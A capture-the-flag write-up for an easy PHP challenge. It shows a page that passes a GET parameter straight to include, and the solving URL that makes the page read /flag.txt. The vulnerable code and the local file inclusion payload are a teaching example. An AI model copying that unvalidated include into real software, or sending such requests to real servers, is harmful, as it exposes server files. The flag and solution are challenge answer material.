# Include

## Easy

## Description
Yet another buggy PHP website.<br/><br/>
Flag is at /flag.txt on filesystem<br/><br/>
Host 1 (San Francisco): include.sf.ctf.so<br/>
Host 2 (Los Angeles): include.la.ctf.so<br/>
Host 3 (New York): include.ny.ctf.so<br/>
Host 4 (Singapore): include.sg.ctf.so

# Solution
Visiting the site shows us the source code
```PHP
<?php
show_source(__FILE__);
@include $_GET["🤯"];

// Fatal error: Uncaught ValueError: Path cannot be empty in /var/www/html/index.php:3 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 3
```
`@include $_GET["🤯"];` means that the GET variable will be loaded on the site<br/>
Hence, we need to set `/flag.txt` as the GET variable<br/>
Thus, we visit `http://include.sg.ctf.so/?%F0%9F%A4%AF=/flag.txt` to get the flag

> we{695ed01b-3d31-46d7-a4a3-06b744d20f4b@1nc1ud3_/etc/passwd_yyds!}